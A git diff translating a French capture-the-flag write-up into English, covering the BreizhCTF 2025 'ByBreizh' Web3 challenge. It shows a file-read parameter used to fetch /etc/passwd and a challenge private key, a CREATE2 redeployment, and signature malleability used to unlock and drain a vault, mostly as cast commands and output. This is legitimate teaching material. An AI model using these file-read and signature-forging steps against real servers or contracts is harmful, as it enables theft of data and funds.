@@ -2,7 +2,7 @@
 authors:
   - K.L.M
 title: "BreizhCTF25 - ByBreizh"
-description: "Exploitation complète d'un challenge Web3 BreizhCTF 2025 : fuite d'une clé privée côté web, interaction avec la factory, puis récupération des fonds volés."
+description: "Full exploitation of a BreizhCTF 2025 Web3 challenge: leak a private key from the website, interact with the factory, then recover the stolen funds."
 publicationDate: 2025-03-17 00:00:00+0000
 cover: ../../../assets/blog/bybreizh-web3/cover.png
 coverAlt: "BreizhCTF25 - ByBreizh"
@@ -15,39 +15,39 @@ tags:
 ---
 ## Description
 
-Description :
+Description:
 
 ```text
-  Oh non, la plateforme ByBreizh a été hackée par un Normand nommé CrêpesMaster. Il a volé toutes les crypto-monnaies des utilisateurs.
+  Oh no, the ByBreizh platform has been hacked by a Norman named CrêpesMaster. He stole all the users' cryptocurrencies.
 
-  Il aurait apparement créé une plateforme nommée ByNormandie pour se moquer de nous ! D'après les informations que nous avons, il serait possible de récupérer la clé privée de son portefeuille et d'accéder à son contrat intelligent lui permettant de gérer ses fonds.
+  Apparently, he created a platform called ByNormandie to mock us! According to the information we have, it should be possible to recover his wallet private key and access his smart contract that lets him manage his funds.
 
-  Nous avons besoin de vous, trouvez sa clé privée en exploitant son site web et récupérez les fonds volés en exploitant les contrats intelligents que vous trouverez ci-joint. (La factory est déjà déployée, à vous de la trouver :))
+  We need you: find his private key by exploiting his website, then recover the stolen funds by exploiting the smart contracts attached here. (The factory is already deployed, it is up to you to find it :))
 
-  La clé privée de CrêpesMaster est dans le fichier `/home/crepesmaster/notes.txt` sur le serveur web.
+  CrêpesMaster's private key is in the file `/home/crepesmaster/notes.txt` on the web server.
 ```
 
-Alors ce challenge c'est un peu mon œuvre préférée, j'ai mis du temps à le créer et également à le résoudre (oui).
+This challenge is probably my favorite work. It took me a while to create it, and also to solve it (yes).
 
-Il y a deux étapes distinctes, l'exploitation du site web puis l'exploitation du contrat.
+There are two distinct steps: exploiting the website, then exploiting the contract.
 
-On commence par l'exploitation du site web.
+We start with the website exploitation.
 
-## Site web
+## Website
 
-### Découverte
+### Discovery
 
-On arrive sur un super site qui nous permet de voir le prix de certaines cryptos :
+We land on a great site that lets us see the price of certain cryptocurrencies:
 ![siteweb](../../../assets/blog/bybreizh-web3/image.png)
-Et même de voir la courbe des 7j derniers.
+We can even view the chart for the last 7 days.
 ![courbe](../../../assets/blog/bybreizh-web3/image-1.png)
 
-Enfin, on peut voir la description du profil de Mr CrepesMaster.
+Finally, we can see Mr. CrepesMaster's profile description.
 ![Crepesmaster](../../../assets/blog/bybreizh-web3/image-2.png)
 
-Bon maintenant il va falloir exploiter ce super site web :)
+Well, now we need to exploit this great website :)
 
-En se baladant sur les pages, on remarque quelque chose dans le code de la page qui permet d'afficher les courbes :
+While browsing the pages, we notice something in the code of the page that displays the charts:
 
 ```html
 <form method="get" action="/crypto/ethereum">
@@ -60,7 +60,7 @@ En se baladant sur les pages, on remarque quelque chose dans le code de la page 
 
 ### Exploitation
 
-On teste alors l'ajout de l'argument `secret_file` dans l'url avec `/etc/passwd` :
+So we test adding the `secret_file` argument to the URL with `/etc/passwd`:
 
 ```html
 <div id="secretModule" class="bg-gray-800 rounded-lg p-4 shadow-lg mb-8" style="display: none;">
@@ -104,22 +104,22 @@ challenge:x:666:666:,,,:/challenge:/bin/bash
     </div>
 ```
 
-C'est exactement ce qu'on cherche ! Maintenant, on va reprendre le chemin de fichier qu'on a dans la description : `/home/crepesmaster/notes.txt`
+This is exactly what we are looking for. Now we reuse the file path from the description: `/home/crepesmaster/notes.txt`
 
-On récupère ce message :
+We retrieve this message:
 
 ```text
-Quels nullos ces bretons, et dire qu'ils avaient 5 signataires et qu'ils sont tous tombes dans le panneau...
+What losers these Bretons are, and to think they had 5 signers and all of them fell for it...
 
-Il faut que je mette ma cle privee quelque part sinon je vais la perdre.
+I need to put my private key somewhere or I am going to lose it.
 
 0x3da2b9f371d75f03e91bbbeb1da81fac34721d71a2b12bd1ae547426a4b4f559
 
-Aller, plus qu'a attendre quelques jours le temps de blanchir tout cet argent. 
+Come on, now I just need to wait a few days to launder all this money. 
 
-LA BRETAGNE EST FINIE
+BRITTANY IS FINISHED
 
-D'ailleurs, je ne dois pas oublier que j'ai mis en place un contrat cle qui permet de deverouiller les interactions avec mon vault :))
+By the way, I must not forget that I set up a key contract that unlocks interactions with my vault :))
 
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -134,20 +134,20 @@ contract Keyy {
 
 salt : 0xad0a990189248f3b99ddf7978b28654f5261b05830d2b4356927726d9528810a
 
-il n'y a que moi qui sait comment je peux deployer ce contrat a la bonne adresse hehehe. Et surtout uniquement moi qui connait l'adresse de ma factory :)
+Only I know how I can deploy this contract at the right address hehehe. And above all, only I know the address of my factory :)
 
-Il n'y a pas de fautes d'orthographe, je ne pouvais juste pas mettre d'accents (je ne sais pas pourquoi).
+There are no spelling mistakes, I just could not use accents (I do not know why).
 ```
 
-NICE ! On va pouvoir se connecter à la blockchain !
+Nice! We can now connect to the blockchain.
 
 ## Blockchain
 
-### Informations
+### Information
 
-On arrive sur le serveur blockchain qui ne nous donnais pas de clé privée avec notre nouvelle clé privée hehe !
+We arrive on the blockchain server, which did not give us a private key, with our new private key hehe.
 
-On récupère l'adresse du contrat cible et le RPC et on exporte nos variables directement :
+We retrieve the target contract address and the RPC, then export our variables directly:
 
 ```bash
 export PK=0x3da2b9f371d75f03e91bbbeb1da81fac34721d71a2b12bd1ae547426a4b4f559
@@ -155,12 +155,12 @@ export RPC=<url>
 export TAR=<address contract>
 ```
 
-### Découverte
+### Discovery
 
-Avec le challenge sont joints deux contrats. Le premier contrat agit un peu comme un Vault personnel qui permet après certaines conditions de faire des mouvements de fonds. Le second est un contrat factory typique d'un déploiement à partir de CREATE2.
-Nous allons chercher à exploiter le premier.
+Two contracts are attached to the challenge. The first contract acts a bit like a personal vault that allows fund movements after certain conditions are met. The second is a typical factory contract for deployments via CREATE2.
+We will try to exploit the first one.
 
-La partie qui nous intéresse est la suivante :
+The part that interests us is the following:
 
 ```solidity
 function authenticate(
@@ -202,26 +202,26 @@ function authenticate(
     }
 ```
 
-On remarque plusieurs choses dans cette fonction, il nous faut pour débloquer le vault, deux signatures valides et un contrat clé qui renvoie la bonne clé.
-D'ailleurs, en parlant de clé, ce contrat est à une adresse fixe c'est bizarre.
-On vérifie qu'elle contient du code :
+We notice several things in this function: to unlock the vault, we need two valid signatures and a key contract that returns the right key.
+Speaking of keys, this contract is at a fixed address, which is strange.
+We check that it contains code:
 
 ```bash
 $ cast code 0xDbCA158868a2701A82Fa2C7748038363eEFE07cf -r $RPC
 0x
 ```
 
-Ah ça c'est très embêtant...
+Ah, that is very annoying.
 
-### Contrat clé
+### Key contract
 
-Mais on se rappelle qu'on a un sel dans le notes.txt hehehe et qu'il parle d'une factory déjà déployée...
+But we remember that we have a salt in `notes.txt`, and that it mentions an already deployed factory.
 
-Notre première mission va donc être de déployer un contrat à cette adresse précise. On connait l'opcode CREATE2 et on sait qu'il nous faut le contrat factory pour l'utiliser.
+So our first mission is to deploy a contract at this exact address. We know the CREATE2 opcode, and we know we need the factory contract to use it.
 
-On va donc aller récupérer l'adresse de la factory en la calculant.
+So we will retrieve the factory address by calculating it.
 
-En inspectant les différents blocs, on se penche sur le bloc 1, on remarque un déploiement d'un gros contrat, on peut supposer que c'est le contrat challenge, alors on passe au bloc 2 et on remarque le déploiement d'un contrat moins long, surement la factory. D'ailleurs si on compile nous même la factory et qu'on compare les deux bytecodes, on retombe exactement sur le même !
+By inspecting the blocks, we look at block 1 and notice the deployment of a large contract, which we can assume is the challenge contract. Then we move to block 2 and notice the deployment of a shorter contract, probably the factory. If we compile the factory ourselves and compare the two bytecodes, we get exactly the same one.
 
 ```bash
 klm@KLM:~$ cast tx 0x5a1be87678ed3c83a6ba481feceb089771445ca58f2c94b2aecf49b9fa94e62f -r $RPC
@@ -243,28 +243,28 @@ value                0
 yParity              1
 ```
 
-Maintenant nous devons calculer l'adresse de la factory, pour ça on va se baser sur ma super conf chez Root-Me :)
-Ou sinon on peut le faire grâce à `cast`
+Now we need to calculate the factory address. For that, we will rely on my great setup from Root-Me :)
+Or we can do it with `cast`
 
 ```bash
 klm@KLM:~$ cast ca 0x08E68BcF51DBa8D3d3A4C99cF8324e7BfFC09419 --nonce 1
 Computed Address: 0xad4967EA626502f0b8F89dc172F2BAa13397f1e2
 ```
 
-Et on vérifie qu'on a bien le code :
+And we check that the code is indeed there:
 
 ```bash
 klm@KLM:~$ cast code 0xad4967EA626502f0b8F89dc172F2BAa13397f1e2 -r $RPC
 0x608060405260043610610028575f3560e01c8063481286e61461002c57806366cfa05714610068575b5f5ffd5b348015610037575f5ffd5b50610052600480360381019061004d9190610213565b610098565b60405161005f9190610290565b60405180910390f35b610082600480360381019061007d9190610418565b6100d4565b60405161008f9190610290565b60405180910390f35b5f60ff60f81b3084846040516020016100b49493929190610534565b604051602081830303815290604052805190602001205f1c905092915050565b5f83471015610118576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161010f906105db565b60405180910390fd5b8282516020840186f590505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603610191576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161018890610643565b60405180910390fd5b7ff40fcec21964ffb566044d083b4073f29f7f7929110ea19e1b3ebe375d89055e816040516101c09190610290565b60405180910390a19392505050565b5f604051905090565b5f5ffd5b5f5ffd5b5f819050919050565b6101f2816101e0565b81146101fc575f5ffd5b50565b5f8135905061020d816101e9565b92915050565b5f5f60408385031215610229576102286101d8565b5b5f610236858286016101ff565b9250506020610247858286016101ff565b9150509250929050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61027a82610251565b9050919050565b61028a81610270565b82525050565b5f6020820190506102a35f830184610281565b92915050565b5f819050919050565b6102bb816102a9565b81146102c5575f5ffd5b50565b5f813590506102d6816102b2565b92915050565b5f5ffd5b5f5ffd5b5f601f19601f8301169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b61032a826102e4565b810181811067ffffffffffffffff82111715610349576103486102f4565b5b80604052505050565b5f61035b6101cf565b90506103678282610321565b919050565b5f67ffffffffffffffff821115610386576103856102f4565b5b61038f826102e4565b9050602081019050919050565b828183375f83830152505050565b5f6103bc6103b78461036c565b610352565b9050828152602081018484840111156103d8576103d76102e0565b5b6103e384828561039c565b509392505050565b5f82601f8301126103ff576103fe6102dc565b5b813561040f8482602086016103aa565b91505092915050565b5f5f5f6060848603121561042f5761042e6101d8565b5b5f61043c868287016102c8565b935050602061044d868287016101ff565b925050604084013567ffffffffffffffff81111561046e5761046d6101dc565b5b61047a868287016103eb565b9150509250925092565b5f7fff0000000000000000000000000000000000000000000000000000000000000082169050919050565b5f819050919050565b6104c96104c482610484565b6104af565b82525050565b5f8160601b9050919050565b5f6104e5826104cf565b9050919050565b5f6104f6826104db565b9050919050565b61050e61050982610270565b6104ec565b82525050565b5f819050919050565b61052e610529826101e0565b610514565b82525050565b5f61053f82876104b8565b60018201915061054f82866104fd565b60148201915061055f828561051d565b60208201915061056f828461051d565b60208201915081905095945050505050565b5f82825260208201905092915050565b7f466f6e647320696e737566666973616e747300000000000000000000000000005f82015250565b5f6105c5601283610581565b91506105d082610591565b602082019050919050565b5f6020820190508181035f8301526105f2816105b9565b9050919050565b7f4563686563206475206465706c6f69656d656e740000000000000000000000005f82015250565b5f61062d601483610581565b9150610638826105f9565b602082019050919050565b5f6020820190508181035f83015261065a81610621565b905091905056fea2646970667358221220dc6dbe557285fc715f24f63711dcfe3fcf58fcfaaeacfee136407d01f8219b9e64736f6c634300081c0033
 ```
 
-Nickel !
+Perfect!
 
-Maintenant on va tenter un deploiement avec le sel qu'on a récupéré. `0xad0a990189248f3b99ddf7978b28654f5261b05830d2b4356927726d9528810a`.
+Now we will try a deployment with the salt we recovered: `0xad0a990189248f3b99ddf7978b28654f5261b05830d2b4356927726d9528810a`.
 
-Mon convertisseur préféré si besoin : https://eth-toolbox.com/
+My favorite converter if needed: https://eth-toolbox.com/
 
-on récupère le bytecode du contrat de clé donné avec :
+We retrieve the bytecode of the provided key contract with:
 
 ```bash
 $ forge inspect src/key.sol:Keyy bytecode
@@ -272,7 +272,7 @@ $ forge inspect src/key.sol:Keyy bytecode
 0x608060405234801561001057600080fd5b5060408051808201909152600e81526d2737b936b0b73234b29a32bb32b960911b602082015260009061004390826100e8565b506101a6565b634e487b7160e01b600052604160045260246000fd5b600181811c9082168061007357607f821691505b60208210810361009357634e487b7160e01b600052602260045260246000fd5b50919050565b601f8211156100e357806000526020600020601f840160051c810160208510156100c05750805b601f840160051c820191505b818110156100e057600081556001016100cc565b50505b505050565b81516001600160401b0381111561010157610101610049565b6101158161010f845461005f565b84610099565b6020601f82116001811461014957600083156101315750848201515b600019600385901b1c1916600184901b1784556100e0565b600084815260208120601f198516915b828110156101795787850151825560209485019460019092019101610159565b50848210156101975786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b61019a806101b56000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063f39d8c6514610030575b600080fd5b61003861004e565b60405161004591906100dc565b60405180910390f35b6000805461005b9061012a565b80601f01602080910402602001604051908101604052809291908181526020018280546100879061012a565b80156100d45780601f106100a9576101008083540402835291602001916100d4565b820191906000526020600020905b8154815290600101906020018083116100b757829003601f168201915b505050505081565b602081526000825180602084015260005b8181101561010a57602081860181015160408684010152016100ed565b506000604082850101526040601f19601f83011684010191505092915050565b600181811c9082168061013e57607f821691505b60208210810361015e57634e487b7160e01b600052602260045260246000fd5b5091905056fea264697066735822122044ec8427a98460fbe813a03818ae6054ddcef31b447bff71f92ff20c58c9499464736f6c634300081c0033
 ```
 
-Ensuite on calcule le hash du bytecode :
+Then we calculate the bytecode hash:
 
 ```bash
 $ cast k 0x608060405234801561001057600080fd5b5060408051808201909152600e81526d2737b936b0b73234b29a32bb32b960911b602082015260009061004390826100e8565b506101a6565b634e487b7160e01b600052604160045260246000fd5b600181811c9082168061007357607f821691505b60208210810361009357634e487b7160e01b600052602260045260246000fd5b50919050565b601f8211156100e357806000526020600020601f840160051c810160208510156100c05750805b601f840160051c820191505b818110156100e057600081556001016100cc565b50505b505050565b81516001600160401b0381111561010157610101610049565b6101158161010f845461005f565b84610099565b6020601f82116001811461014957600083156101315750848201515b600019600385901b1c1916600184901b1784556100e0565b600084815260208120601f198516915b828110156101795787850151825560209485019460019092019101610159565b50848210156101975786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b61019a806101b56000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063f39d8c6514610030575b600080fd5b61003861004e565b60405161004591906100dc565b60405180910390f35b6000805461005b9061012a565b80601f01602080910402602001604051908101604052809291908181526020018280546100879061012a565b80156100d45780601f106100a9576101008083540402835291602001916100d4565b820191906000526020600020905b8154815290600101906020018083116100b757829003601f168201915b505050505081565b602081526000825180602084015260005b8181101561010a57602081860181015160408684010152016100ed565b506000604082850101526040601f19601f83011684010191505092915050565b600181811c9082168061013e57607f821691505b60208210810361015e57634e487b7160e01b600052602260045260246000fd5b5091905056fea264697066735822122044ec8427a98460fbe813a03818ae6054ddcef31b447bff71f92ff20c58c9499464736f6c634300081c0033
@@ -280,7 +280,7 @@ $ cast k 0x608060405234801561001057600080fd5b5060408051808201909152600e81526d273
 0xc50cd2636c938f8abdc913197fe057dbd8f494a5fe67d5e29899b5c217dfbcbc
 ```
 
-Puis on demande à notre factory de calculer l'adresse de déploiement pour nous :
+Then we ask our factory to calculate the deployment address for us:
 
 ```bash
 klm@KLM:~$ cast call $FACTORY "computeAddress(bytes32,bytes32)(address)" 0xad0a990189248f3b99ddf7978b28654f5261b05830d2b4356927726d9528810a 0xc50cd2636c938f8abdc913197fe057dbd8f494a5fe67d5e29899b5c217dfbcbc -r $RPC
@@ -288,7 +288,7 @@ klm@KLM:~$ cast call $FACTORY "computeAddress(bytes32,bytes32)(address)" 0xad0a9
 0xDbCA158868a2701A82Fa2C7748038363eEFE07cf
 ```
 
-On retrouve bien l'adresse visée !!! Alors on s'empresse de déployer notre contrat clé :
+We do indeed get the target address. So we hurry up and deploy our key contract:
 
 ```bash
 klm@KLM:~$ cast send $FACTORY "deploy(uint256,bytes32,bytes)" 0 0xad0a990189248f3b99ddf7978b28654f5261b05830d2b4356927726d9528810a 0x608060405234801561001057600080fd5b5060408051808201909152600e81526d2737b936b0b73234b29a32bb32b960911b602082015260009061004390826100e8565b506101a6565b634e487b7160e01b600052604160045260246000fd5b600181811c9082168061007357607f821691505b60208210810361009357634e487b7160e01b600052602260045260246000fd5b50919050565b601f8211156100e357806000526020600020601f840160051c810160208510156100c05750805b601f840160051c820191505b818110156100e057600081556001016100cc565b50505b505050565b81516001600160401b0381111561010157610101610049565b6101158161010f845461005f565b84610099565b6020601f82116001811461014957600083156101315750848201515b600019600385901b1c1916600184901b1784556100e0565b600084815260208120601f198516915b828110156101795787850151825560209485019460019092019101610159565b50848210156101975786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b61019a806101b56000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063f39d8c6514610030575b600080fd5b61003861004e565b60405161004591906100dc565b60405180910390f35b6000805461005b9061012a565b80601f01602080910402602001604051908101604052809291908181526020018280546100879061012a565b80156100d45780601f106100a9576101008083540402835291602001916100d4565b820191906000526020600020905b8154815290600101906020018083116100b757829003601f168201915b505050505081565b602081526000825180602084015260005b8181101561010a57602081860181015160408684010152016100ed565b506000604082850101526040601f19601f83011684010191505092915050565b600181811c9082168061013e57607f821691505b60208210810361015e57634e487b7160e01b600052602260045260246000fd5b5091905056fea264697066735822122044ec8427a98460fbe813a03818ae6054ddcef31b447bff71f92ff20c58c9499464736f6c634300081c0033 -r $RPC --private-key $PK --value 0.1ether
@@ -311,11 +311,11 @@ to                      0xad4967EA626502f0b8F89dc172F2BAa13397f1e2
 blobGasPrice             "0x1"
 ```
 
-Maintenant que l'on a réussi à déployer un contrat clé nous allons pouvoir nous occuper de la signature.
+Now that we have successfully deployed a key contract, we can take care of the signature.
 
-### Forge de signature
+### Signature forging
 
-On remarque que la fonction authenticate vérifie qu'elle possède bien deux signatures différentes pour un même message, c'est plutôt embêtant, car on ne sait pas signer deux fois le même message de façon différente. A moins que ce contrat utilise ecrecover...
+We notice that the `authenticate` function checks that it has two different signatures for the same message. That is rather annoying, because we cannot sign the same message twice in different ways. Unless this contract uses `ecrecover`.
 
 ```solidity
 function _recoverSigner(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {
@@ -323,10 +323,10 @@ function _recoverSigner(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pu
     }
 ```
 
-Bon... Bon.. Bon.
-Au charbon alors !
+Well, well, well.
+Time to get to work then!
 
-On signe un premier message :
+We sign a first message:
 
 ```bash
 $ cast wallet sign "Hacked By KLM" --private-key $PK
@@ -334,9 +334,9 @@ $ cast wallet sign "Hacked By KLM" --private-key $PK
 0x281fc9b229b14aaf59dc399f93d137879bad6524490fbd18a693568e71b3b5fd2402de01470404ae1af5e62d931f25dc6ba2abc5401dc0f5d893a94b063798b31c
 ```
 
-Si jamais vous ne savez pas, une signature ethereum est composée en 3 parties, V,R et S qui sont des nombres, V varie entre 27 et 28 qui indiquent de quel coté de la courbe nous sommes, et R et S sont les coordonnées du point sur la courbe. Pour avoir deux signatures différentes qui renvoient la même adresse, il nous suffit de prendre l'inverse du point :))
+If you do not know, an Ethereum signature is made of three parts: V, R, and S, which are numbers. V is either 27 or 28 and indicates which side of the curve we are on, while R and S are the coordinates of the point on the curve. To get two different signatures that return the same address, we just need to take the inverse of the point :))
 
-Maintenant on va calculer l'inverse du s de notre signature, pour récupérer les valeurs à partir d'une signature, j'utilise un super contrat depuis remix :
+Now we calculate the inverse of the S value from our signature. To recover the values from a signature, I use a small contract in Remix:
 
 ```solidity
 // SPDX-License-Identifier: UNLICENSED
@@ -369,12 +369,12 @@ contract Sig{
 }
 ```
 
-Avec ça on récupère :
+With that, we retrieve:
 V = 28
 R = 0x281fc9b229b14aaf59dc399f93d137879bad6524490fbd18a693568e71b3b5fd
 S = 0x2402de01470404ae1af5e62d931f25dc6ba2abc5401dc0f5d893a94b063798b3
 
-Puis on inverse S :
+Then we invert S:
 
 ```python
 >>> N = 115792089237316195423570985008687907852837564279074904382605163141518161494337
@@ -383,8 +383,8 @@ Puis on inverse S :
 '0xdbfd21feb8fbfb51e50a19d26ce0da224f0c31216f2adf45e73eb541c9fea88e'
 ```
 
-Okay ! Maintenant il n'y a plus qu'à tout récapituler :
-Hash du message "Hacked By KLM" = `0x0855d0ae394da2f074e1645fbfd3a337c39991cbde1e1c753d7016c27a655793` (calculé avec un script python, car je suis mauvais mdr)
+Okay! Now all that is left is to recap everything:
+Hash of the message "Hacked By KLM" = `0x0855d0ae394da2f074e1645fbfd3a337c39991cbde1e1c753d7016c27a655793` (calculated with a Python script, because I am bad lol)
 V1 = `28`
 R1 = `0x281fc9b229b14aaf59dc399f93d137879bad6524490fbd18a693568e71b3b5fd`
 S1 = `0x2402de01470404ae1af5e62d931f25dc6ba2abc5401dc0f5d893a94b063798b3`
@@ -392,7 +392,7 @@ V2 = `27`
 R2 = `0x281fc9b229b14aaf59dc399f93d137879bad6524490fbd18a693568e71b3b5fd`
 S2 = `0xdbfd21feb8fbfb51e50a19d26ce0da224f0c31216f2adf45e73eb541c9fea88e`
 
-On envoie alors la transaction et si tout passe on est content :
+We then send the transaction. If everything passes, we are happy:
 
 ```bash
 $ cast send $TAR "authenticate(bytes32,uint8,bytes32,bytes32,uint8,bytes32,bytes32)" 0x0855d0ae394da2f074e1645fbfd3a337c39991cbde1e1c753d7016c27a655793 27 0x281fc9b229b14aaf59dc399f93d137879bad6524490fbd18a693568e71b3b5fd 0xdbfd21feb8fbfb51e50a19d26ce0da224f0c31216f2adf45e73eb541c9fea88e 28 0x281fc9b229b14aaf59dc399f93d137879bad6524490fbd18a693568e71b3b5fd 0x2402de01470404ae1af5e62d931f25dc6ba2abc5401dc0f5d893a94b063798b3 -r $RPC --private-key $PK
@@ -415,7 +415,7 @@ to                      0x13B408cf7b336C7e851AdBdb838D1688Bb8FC036
 blobGasPrice             "0x1"
 ```
 
-On vérifie que la variable unlocked est à true :
+We check that the `unlocked` variable is true:
 
 ```bash
 $ cast call $TAR "unlocked()(bool)" -r $RPC
@@ -423,9 +423,9 @@ $ cast call $TAR "unlocked()(bool)" -r $RPC
 true
 ```
 
-Win !
+Win!
 
-Il ne nous reste plus qu'à détruire le contrat :
+All that remains is to destroy the contract:
 
 ```bash
 $ cast send $TAR "destroyVault(address)" $ME -r $RPC --private-key $PK
@@ -448,4 +448,4 @@ to                      0x9A5F94E8a3F122D781AA25c63538142d7d0D2837
 blobGasPrice             "0x1"
 ```
 
-On récupère ensuite notre flag sur la plateforme ! GG, j'attends vos retours sur le challenge, la partie du create2 me semblait un peu guessy mais on verra :)) !
+We then retrieve our flag on the platform. GG, I am waiting for your feedback on the challenge. The CREATE2 part felt a bit guessy to me, but we will see :))
